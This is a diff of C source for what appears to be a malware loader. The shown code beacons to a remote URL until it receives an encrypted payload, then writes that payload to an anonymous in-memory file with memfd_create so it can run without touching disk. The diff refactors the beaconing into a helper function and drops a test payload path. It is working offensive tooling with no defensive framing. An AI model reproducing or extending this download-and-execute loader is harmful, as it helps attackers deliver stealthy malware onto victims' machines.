@@ -7,8 +7,6 @@
 #include "networking.h"
 #include "preferences.h"
 
-#define PAYLOAD_FILE "../test_files/test_ELF" // payload file to open, delete on final version
-
 int main(int argc, char **argv){
     struct MemoryStruct payload;
     void *decrypted;
@@ -20,23 +18,7 @@ int main(int argc, char **argv){
     char * payload_envp[] = PAYLOAD_ENVP; // envp for payload
     char *pathToWrite = PATH_TO_WRITE;
     
-    if(BEACON_MODE <= 0){
-        payload = getHTTPS(PAYLOAD_URL);
-        if(payload.memory == NULL){ // error condition
-            return 0;
-        }
-    } else { // beacon every x seconds
-        while(1){
-            sleep(BEACON_MODE);
-            payload = getHTTPS(PAYLOAD_URL);
-            if(payload.memory == NULL) // continue beaconing if no file returned
-                continue;
-            break; // exit beaconing loop if file is returned
-        }
-    }
-
-    payload = getHTTPS(PAYLOAD_URL);
-
+    payload = beacon(PAYLOAD_URL);
 
     while ((payloadFD = memfd_create("payload", 0)) <= 2){ // create memory file descriptor for execution
         printf("memfd_create() failed. File descriptor created: %d\n", payloadFD);
